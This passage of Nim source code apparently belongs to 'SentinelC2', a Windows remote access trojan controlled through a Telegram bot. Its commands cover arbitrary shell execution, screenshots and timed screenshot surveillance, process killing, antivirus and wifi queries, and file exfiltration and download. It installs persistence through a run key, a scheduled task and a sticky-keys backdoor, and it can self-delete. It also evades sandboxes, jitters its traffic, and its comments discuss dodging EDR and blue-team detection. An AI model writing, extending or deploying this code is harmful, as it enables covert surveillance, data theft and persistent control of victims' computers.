    if parts.len > 2: stickey = (if parts[2].toLowerAscii == "true": "OK" else: "NOT INSTALLED")
  except: discard
  let lastOkStr = if lastPollOk > 0'i64:
    $(getMonoTime().ticks div 1_000_000_000 - lastPollOk) & "s ago"
  else: "never"
  return "uptime:       " & $h & "h" & $m & "m" & $s & "s\n" &
         "pid:          " & $getCurrentProcessId() & "\n" &
         "admin:        " & $(IsUserAnAdmin() != 0) & "\n" &
         "exe:          " & getAppFilename() & "\n" &
         "install_dir:  " & RuntimeInstallDir & "\n" &
         "install_name: " & RuntimeInstallName & "\n" &
         "mutex:        " & MutexName & "\n" &
         "polls:        " & $pollsOk & "/" & $pollsTotal & " ok\n" &
         "last_poll:    " & lastOkStr & "\n" &
         "last_err:     " & (if lastPollErr.len > 0: lastPollErr else: "-") & "\n" &
         "persistence:\n" &
         "  run_key:    " & runkey & "\n" &
         "  task:       " & task & "\n" &
         "  stickykeys: " & stickey

proc cmdCleanup(): string =
  let results = removePersistence()
  var lines: seq[string] = @[]
  for k, v in results: lines.add(k & ": " & v)
  return "cleanup:\n" & lines.join("\n")

proc cmdWatch(arg: string): string =
  ## Periodic screenshot watcher. Replaces the "screenshot on every
  ## click/scroll" idea with something that won't DOS the agent or
  ## get it EDR-flagged in seconds. Operator controls the cadence.
  ##
  ## /watch               -> show status
  ## /watch start 30      -> screenshot every 30 sec (default)
  ## /watch start 5       -> every 5 sec (heavy; use sparingly)
  ## /watch count 20 30   -> take 20 shots every 30 sec then auto-stop
  ## /watch stop          -> stop
  let parts = arg.split(' ', 1)
  let sub  = if parts.len > 0: parts[0].strip().toLowerAscii else: ""
  let rest = if parts.len > 1: parts[1].strip() else: ""

  if sub == "":
    # Status
    let shots = watchShotsTaken
    let maxShots = if watchMaxShots > 0: $watchMaxShots else: "unbounded"
    return "watch: " & (if watchActive.load: "active" else: "stopped") &
           "\n  interval: " & $(watchIntervalMs div 1000) & " sec" &
           "\n  shots:    " & $shots & " / " & maxShots &
           "\n  usage:    /watch start [sec] | /watch count N [sec] | /watch stop"

  if sub == "stop":
    if not watchActive.load: return "watch already stopped"
    watchActive.store(false)
    # The thread checks the flag every interval-ms, so it might take
    # up to `interval` ms to actually exit. That's fine.
    return "watch stopping (will exit within " &
           $(watchIntervalMs div 1000) & " sec)"

  if sub == "start":
    if watchActive.load: return "watch already running; /watch stop first"
    let sec = if rest.len > 0: (try: parseInt(rest) except: 0) else: 30
    if sec < 1 or sec > 3600: return "interval must be 1-3600 sec"
    watchIntervalMs = sec * 1000
    watchMaxShots = -1
    watchShotsTaken = 0
    watchActive.store(true)
    createThread(watchThread, watchLoop)
    return "watch started: every " & $sec & " sec, runs until /watch stop"

  if sub == "count":
    # /watch count N [interval]
    let cparts = rest.split(' ', 1)
    let n = (try: parseInt(cparts[0].strip()) except: 0)
    if n < 1 or n > 10000: return "count must be 1-10000"
    let sec = if cparts.len > 1: (try: parseInt(cparts[1].strip()) except: 30)
              else: 30
    if sec < 1 or sec > 3600: return "interval must be 1-3600 sec"
    if watchActive.load: return "watch already running; /watch stop first"
    watchIntervalMs = sec * 1000
    watchMaxShots = n
    watchShotsTaken = 0
    watchActive.store(true)
    createThread(watchThread, watchLoop)
    return "watch started: " & $n & " shots every " & $sec & " sec, then auto-stops"

  return "usage: /watch [start [sec] | count N [sec] | stop]"

proc cmdSelfdestruct(): string =
  let results = removePersistence()
  var lines: seq[string] = @[]
  for k, v in results: lines.add("  " & k & ": " & v)
  let binary = RuntimeInstallDir / RuntimeInstallName
  var deleted = false
  var how = ""
  if fileExists(binary):
    try:
      removeFile(binary)
      deleted = true
      how = "direct"
    except:
      # Direct delete failed. Almost certainly because the file is
      # locked — we ARE the running binary at the install path.
      # Spawn a DETACHED cmd that waits long enough for us to quit(0)
      # and release the lock, then deletes the file. We use
      # startProcess with poDaemon and discard the handle so the
      # child detaches and runs to completion without us waiting.
      # The 4-second ping (5 echoes) gives quit() plenty of time.
      try:
        discard startProcess(
          command = "cmd.exe",
          args = @["/c", "ping 127.0.0.1 -n 5 > nul & del \"" & binary & "\""],
          options = {poDaemon, poStdErrToStdOut, poUsePath}
        )
        how = "scheduled"
      except: discard
  let status = if deleted: "deleted"
               elif how.len > 0: "scheduled for delete"
               else: "left in place"
  lines.add("  binary: " & status & " (" & binary & ", " & how & ")")
  let summary = "selfdestruct complete:\n" & lines.join("\n")
  # sendMessage is forward-declared at the top of this module
  # (cmdSelfdestruct is called by handleMessage which sits above the
  # HTTP client section in this file).
  discard sendMessage(summary)
  quit(0)

# =============================================================================
# Telegram HTTP client
# -----------------------------------------------------------------------------
# Single shared HttpClient instance. The agent's request volume is tiny
# (one poll every few seconds + occasional sends), so connection
# reuse is the right trade-off.
# =============================================================================
var
  tgHttp: HttpClient

proc buildHttpClient(): HttpClient =
  let proxy = if ProxyUrl.len > 0: newProxy(parseUri(ProxyUrl)) else: nil
  result = newHttpClient(
    userAgent = UserAgent,
    timeout = (PollHttpSec + 10) * 1000,
    maxRedirects = 0,
    proxy = proxy
  )
  result.headers = newHttpHeaders({
    "User-Agent": UserAgent,
    "Accept": "*/*"
  })

proc apiUrl(methodName: string): string =
  ## Compose the full Telegram Bot API URL for a method.
  ApiBase & "/" & methodName

proc sendMessage(text: string): bool =
  ## Send a plain text message to the operator. Splits long output.
  if text.len == 0: return true
  let chunks = chunkText(text, TgChunkLimit)
  result = true
  for c in chunks:
    try:
      var obj = newJObject()
      obj["chat_id"] = %ChatId
      obj["text"] = %c
      tgHttp.headers = newHttpHeaders({
        "Content-Type": "application/json",
        "User-Agent": UserAgent
      })
      let resp = tgHttp.post(apiUrl("sendMessage"), body = $obj)
      if resp.status[0..2] != "200":
        logMsg("sendMessage non-200: " & resp.status & " body=" & resp.body[0..<min(200, resp.body.len)])
        result = false
    except CatchableError as e:
      logMsg("sendMessage err: " & e.msg)
      result = false

proc sendDocument(path: string, caption: string = ""): bool =
  ## Upload a file as a Telegram document.
  if not fileExists(path):
    logMsg("sendDocument: not a file: " & path)
    return false
  try:
    let data = readFile(path)
    var mpb = newMultipartData()
    mpb["chat_id"] = ChatId
    if caption.len > 0: mpb["caption"] = caption[0..<min(1024, caption.len)]
    mpb.add("document", data, extractFilename(path))
    let resp = tgHttp.post(apiUrl("sendDocument"), multipart = mpb)
    let ok = resp.status[0..2] == "200"
    if not ok: logMsg("sendDocument non-200: " & resp.status)
    return ok
  except CatchableError as e:
    logMsg("sendDocument err: " & e.msg)
    return false

proc downloadTelegramFile(fileId: string, saveTo: string): bool =
  ## Download a Telegram file by file_id. Two-step: getFile -> download.
  try:
    var infoObj = newJObject()
    infoObj["file_id"] = %fileId
    tgHttp.headers = newHttpHeaders({
      "Content-Type": "application/json",
      "User-Agent": UserAgent
    })
    let infoResp = tgHttp.post(apiUrl("getFile"), body = $infoObj)
    if infoResp.status[0..2] != "200": return false
    let info = parseJson(infoResp.body)
    let filePath = info{"result", "file_path"}.getStr
    if filePath.len == 0: return false
    let url = ApiPathRoot & "/file/bot" & BotToken & "/" & filePath
    let resp = tgHttp.get(url)
    if resp.status[0..2] != "200": return false
    let f = open(saveTo, fmWrite)
    defer: f.close()
    f.write(resp.body)
    return true
  except CatchableError as e:
    logMsg("downloadTelegramFile err: " & e.msg)
    return false

# =============================================================================
# Command dispatch
# =============================================================================
proc splitCmd(text: string): tuple[cmd: string, arg: string] =
  let parts = text.split(' ', 1)
  result.cmd = if parts.len > 0: parts[0].toLowerAscii else: ""
  result.arg = if parts.len > 1: parts[1] else: ""

proc handleMessage(text: string, msg: JsonNode): string =
  ## Returns the reply text (or "" to send nothing).
  let (cmd, arg) = splitCmd(text)
  if cmd.len == 0: return ""
  case cmd
  of "/help", "/?":         cmdHelp()
  of "/cmd", "/shell":      cmdExec(arg)
  of "/sysinfo":            cmdSysinfo()
  of "/screenshot":         cmdScreenshot()
  of "/ps":                 cmdExec("tasklist /v /fo csv")
  of "/kill":
    try:
      discard parseInt(arg.strip())
      let (o, _) = execCmdEx("taskkill /F /PID " & arg)
      "taskkill exit=" & $o
    except: "usage: /kill <pid>"
  of "/ls":                 cmdLs(arg)
  of "/cat":                cmdCat(arg)
  of "/cd":
    try: setCurrentDir(arg); "cwd: " & getCurrentDir()
    except CatchableError as e: "cd err: " & e.msg
  of "/pwd":                getCurrentDir()
  of "/whoami":             getEnv("USERNAME", "?") & " @ " & getEnv("COMPUTERNAME", "?")
  of "/env":                cmdEnv(arg)
  of "/drives":             logicalDrives()
  of "/ipconfig":           cmdExec("ipconfig /all")
  of "/wifi":               cmdWifi()
  of "/av":                 cmdAv()
  of "/persist":
    var lines: seq[string] = @[]
    lines.add("run_key:    " & installRunKey())
    lines.add("task:       " & installScheduledTask())
    lines.add("stickykeys: " & installStickyKeys())
    lines.join("\n")
  of "/stickykeys":         installStickyKeys()
  of "/status":             cmdStatus()
  of "/cleanup":            cmdCleanup()
  of "/watch":              cmdWatch(arg)
  of "/selfdestruct":
    # Stop the screenshot watcher first so it doesn't keep the
    # process alive after quit(0).
    if watchActive.load: watchActive.store(false)
    discard cmdSelfdestruct(); ""
  of "/exit":
    if watchActive.load: watchActive.store(false)
    discard sendMessage("agent exiting (use /selfdestruct to clean up)")
    quit(0)
  of "/sleep":
    try:
      let n = max(0, parseInt(arg.strip()))
      let capped = min(n, 24 * 3600)
      sleep(capped * 1000)
      "slept " & $n & "s"
    except: "usage: /sleep <seconds>"
  of "/upload":
    if fileExists(arg):
      let sz = getFileSize(arg)
      if sendDocument(arg, arg & " (" & $sz & " B)"): "uploaded: " & arg
      else: "upload failed"
    else: "not a file: " & arg
  of "/dl":
    let tmp = getEnv("TEMP", getEnv("USERPROFILE", ".")) /
              ("dl_" & $(getMonoTime().ticks div 1_000_000))
    if arg.len > 0 and downloadTelegramFile(arg, tmp):
      "downloaded: " & tmp & " (" & $getFileSize(tmp) & " B)"
    else: "download failed"
  else:
    # Reject unknown commands instead of passing them to cmdExec.
    # The old "anything goes -> shell" fallback had two problems:
    #   1. OPSEC noise: every typo (/helpp, "hello", etc.) spawned
    #      a cmd.exe process and generated a 4688 process-create
    #      event. Easy Blue Team signal.
    #   2. Security: a compromised bot token (or a chat the bot was
    #      added to) could run arbitrary shell as the user. The
    #      explicit /cmd <shell> path is the only way to run a
    #      shell command now.
    "unknown command: " & cmd & " (try /help)"

# =============================================================================
# Long-polling loop
# =============================================================================
proc initialOnline() =
  try:
    discard sendMessage("SentinelC2 / Telegram online\n\n" & cmdSysinfo())
  except: discard

proc pollLoop() =
  ## Long-poll getUpdates forever, dispatch commands.
  var offset = 0
  while true:
    inc pollsTotal
    try:
      var bodyObj = newJObject()
      bodyObj["offset"] = %offset
      bodyObj["timeout"] = %PollHttpSec
      var allowed = newJArray()
      allowed.add(%"message")
      bodyObj["allowed_updates"] = allowed
      let body = $bodyObj
      tgHttp.headers = newHttpHeaders({
        "Content-Type": "application/json",
        "User-Agent": UserAgent
      })
      let resp = tgHttp.post(apiUrl("getUpdates"), body = body)
      if resp.status[0..2] != "200":
        lastPollErr = "http " & resp.status
        logMsg("poll http err: " & lastPollErr)
        sleep(min(30_000, PollBaseMs * 3))
        continue
      lastPollOk = getMonoTime().ticks div 1_000_000_000
      lastPollErr = ""
      inc pollsOk
      let data = parseJson(resp.body)
      if not data.hasKey("result"): continue
      for upd in data["result"]:
        offset = max(offset, upd["update_id"].getInt + 1)
        if not upd.hasKey("message"): continue
        let msg = upd["message"]
        # chat.id is a JSON integer, NOT a string. .getStr on a JInt
        # node returns the default fallback ("") because the node
        # kind != JString, so the comparison "" != "<our chat id>"
        # would silently drop every message. Read as int and stringify.
        # Also verify the expected shape — if chat or chat.id is
        # missing entirely (unexpected Telegram API change or weird
        # client), drop the message rather than accidentally
        # accepting whatever .getInt defaults to.
        if not msg.hasKey("chat") or not msg["chat"].hasKey("id"):
          logMsg("drop msg with missing chat.id")
          continue
        let chatIdVal = msg["chat"]["id"].getInt
        if $chatIdVal != ChatId:
          logMsg("drop msg from chat " & $chatIdVal)
          continue
        # File upload out-of-band
        if msg.hasKey("document"):
          let doc = msg["document"]
          let fid = doc{"file_id"}.getStr
          # Sanitize the file name. The Telegram API trusts whatever
          # the sender put in `file_name`, so a name like
          #   ..\..\..\..\Windows\System32\evil.exe
          # would otherwise escape %TEMP% and overwrite system files
          # when running as SYSTEM/admin. Take the basename only and
          # strip any residual path separators, then prefix with a
          # monotonic timestamp so repeated uploads don't collide.
          let rawName = doc{"file_name"}.getStr("uploaded")
          let baseName = rawName.extractFilename()
          let safeName = baseName.replace('/', '_').replace('\\', '_')
          let stamp = $getMonoTime().ticks
          let tmp = getEnv("TEMP", getEnv("USERPROFILE", ".")) /
                    ("tg_" & stamp & "_" & safeName)
          if downloadTelegramFile(fid, tmp):
            discard sendMessage("downloaded: " & tmp & " (" & $getFileSize(tmp) & " B)")
          else:
            discard sendMessage("download failed")
          continue
        # Text / caption command
        let text = msg{"text"}.getStr(msg{"caption"}.getStr(""))
        if text.len == 0: continue
        try:
          let reply = handleMessage(text, msg)
          if reply.len > 0:
            if reply.startsWith("@file:"):
              let path = reply[6..^1]
              discard sendDocument(path, "screenshot")
              try: removeFile(path) except: discard
            else:
              discard sendMessage(reply)
        except CatchableError as e:
          discard sendMessage("handler err: " & e.msg)
    except CatchableError as e:
      lastPollErr = e.msg
      logMsg("poll err: " & e.msg)
      try: sleep(5_000) except: discard
    # Jitter the cadence - look less robotic
    let jitter = PollBaseMs.int * (70 + rand(60)) div 100
    try: sleep(jitter) except: discard

# =============================================================================
# Entry point
# =============================================================================
proc main() =
  runStartupSanityChecks()
  if not acquireMutex():
    logMsg("another instance owns the mutex, exiting")
    return
  if isSandbox():
    logMsg("sandbox heuristic triggered, exiting silently")
    return
  ensurePersistenceAtStartup()
  initialOnline()
  pollLoop()

when isMainModule:
  # Top-level crash barrier. Any unhandled exception (IndexDefect,
  # NilAccessDefect, etc.) lands here instead of triggering the GUI
  # "fatal.nim sysFatal" dialog. The error is logged to C2_LOG_FILE
  # if set, AND written to %TEMP%\sentinel_crash.log as a last-resort
  # breadcrumb so the operator can recover the actual stack even if
  # the GUI dialog was dismissed without reading.
  proc emergencyLog(msg: string) =
    ## Write to the configured C2_LOG_FILE and, as a fallback, to
    ## %TEMP%\sentinel_crash.log. Never throws.
    let ts = "[" & now().format("yyyy-MM-dd HH:mm:ss") & "] "
    let line = ts & msg & "\n"
    let configured = LogFilePath
    if configured.len > 0:
      try:
        let f = open(configured, fmAppend)
        defer: f.close()
        f.write(line)
        return
      except: discard
    try:
      let fallback = getEnv("TEMP", getEnv("USERPROFILE", ".")) /
                     "sentinel_crash.log"
      let f = open(fallback, fmAppend)
      defer: f.close()
      f.write(line)
    except: discard

  proc describeError(e: ref Exception): string =
    ## Build a human-readable error string with the exception name and
    ## (when available) the stack trace. IndexDefect, NilAccessDefect,
    ## etc. are all caught at this point.
    try:
      result = $e.name & ": " & e.msg
      if e.trace.len > 0:
        result.add("\n--- stack trace ---\n")
        result.add($e.trace)
        result.add("\n--- end trace ---")
    except:
      result = "unknown error (" & $e.name & ")"

  tgHttp = buildHttpClient()
  randomize()
  try:
    main()
  except CatchableError as e:
    # IndexDefect, NilAccessDefect, RangeDefect, etc. all inherit
    # from CatchableError in modern Nim. Log and exit cleanly.
    emergencyLog("FATAL: " & describeError(e))
  except Defect as d:
    # Defects that aren't CatchableError (e.g. NilAccessDefect on
    # some Nim versions) are caught here as a second net.
    emergencyLog("FATAL DEFECT: " & describeError(d))
  except: # last resort
    emergencyLog("FATAL: unknown unhandled exception")
